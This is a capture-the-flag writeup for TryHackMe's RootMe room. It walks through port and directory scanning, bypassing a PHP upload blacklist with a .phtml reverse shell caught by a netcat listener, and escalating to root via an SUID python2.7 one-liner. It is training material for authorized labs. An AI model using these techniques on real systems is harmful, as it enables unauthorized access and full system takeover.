# RootMe – TryHackMe Writeup

## 1. Overview

* **Platform:** TryHackMe
* **Room Name:** RootMe
* **Difficulty:** Easy
* **Category:** Web Exploitation, Privilege Escalation

This writeup documents the process of identifying, exploiting, and escalating privileges on the RootMe machine. The objective was to obtain both user and root access through systematic enumeration and exploitation techniques.

---

## 2. Methodology

The assessment followed a structured penetration testing approach:

1. Enumeration
2. Initial Access (Exploitation)
3. Privilege Escalation
4. Post-Exploitation

---

## 3. Enumeration

### 3.1 Network Scanning

An Nmap scan was conducted to identify open ports and services:

```
nmap -sV -sC -T4 <TARGET_IP>
```

**Findings:**

* Port 22: SSH (OpenSSH 7.6p1)
* Port 80: HTTP (Apache 2.4.29)

### 3.2 Directory Enumeration

Gobuster was used to discover hidden web directories:

```
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
```

**Results:**

* `/panel/` – File upload interface
* `/uploads/` – Directory storing uploaded files

---

## 4. Initial Access

### 4.1 Vulnerability Identification

The application was vulnerable to unrestricted file upload, allowing execution of malicious files on the server.

### 4.2 Exploitation

The upload functionality blocked `.php` files via a blacklist. This restriction was bypassed by renaming the payload to `.phtml`.

Steps performed:

1. Start a Netcat listener:

```
nc -lvnp 1234
```

2. Upload the payload (`shell.phtml`) via `/panel/`

3. Execute the payload:

```
http://<TARGET_IP>/uploads/shell.phtml
```

**Result:**
A reverse shell was obtained as the `www-data` user.

---

## 5. Privilege Escalation

### 5.1 SUID Enumeration

The following command was used to identify SUID binaries:

```
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

**Finding:**

* `/usr/bin/python2.7` with SUID permissions

### 5.2 Exploitation

Using a known GTFOBins technique:

```
python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

**Result:**
Privilege escalation to root was successfully achieved.

---

## 6. Flags

* **User Flag:** Retrieved from the system
* **Root Flag:** Retrieved after privilege escalation

---

## 7. Key Learnings

* Importance of thorough enumeration
* Risks associated with insecure file upload mechanisms
* Impact of misconfigured SUID binaries
* Practical use of reverse shells and privilege escalation techniques

---

## 8. Report

The full penetration testing report is available below:

[Download Full Report](./report/rootme-report.docx)

---

## 9. Evidence

Relevant screenshots demonstrating the exploitation steps should be included in the `screenshots/` directory.

---

## 10. Disclaimer

This writeup is intended for educational purposes only. All activities were performed on authorized platforms.
